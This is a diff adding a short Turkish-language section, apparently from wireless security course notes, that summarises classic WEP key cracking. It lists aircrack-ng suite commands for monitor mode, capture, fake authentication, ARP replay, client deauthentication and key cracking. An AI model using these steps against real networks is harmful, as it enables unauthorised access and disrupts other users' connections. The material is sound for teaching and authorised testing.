@@ -1,0 +1,25 @@
+7.6 Classic WEP Cracking Attack Summary 
+
+Kablosuz kartınızı AP'nin kanal numarasında monitör moduna yerleştirin:
+
+# airmon-ng start <interface> <AP channel> 
+
+AP kanalı ve BSSID üzerinde bir Airodump-ng yakalama filtresi başlatın ve dosyayı diske kaydedin:
+
+# airodump-ng -c <AP Kanalı> --bssid <AP MAC> -w <yakalama> <arayüz>
+
+AP'ye karşı sahte bir kimlik doğrulama saldırısı gerçekleştirin:
+
+# aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <MAC'iniz> <arayüz>
+
+ARP isteği yeniden oynatma saldırısını başlatın:
+
+# aireplay-ng -3 -b <AP MAC> -h <MAC'iniz> <arayüz>
+
+AP tarafından yeni IV neslini zorlamak için bağlı istemcinin kimlik doğrulamasını kaldırın:
+
+# aireplay-ng -0 1 -a <AP MAC> -c <İstemci MAC> <arayüz>
+
+Önemli sayıda IV yakalandıktan sonra, Airodump yakalamasına karşı Aircrack-ng'yi çalıştırın:
+
+# aircrack-ng <capture>
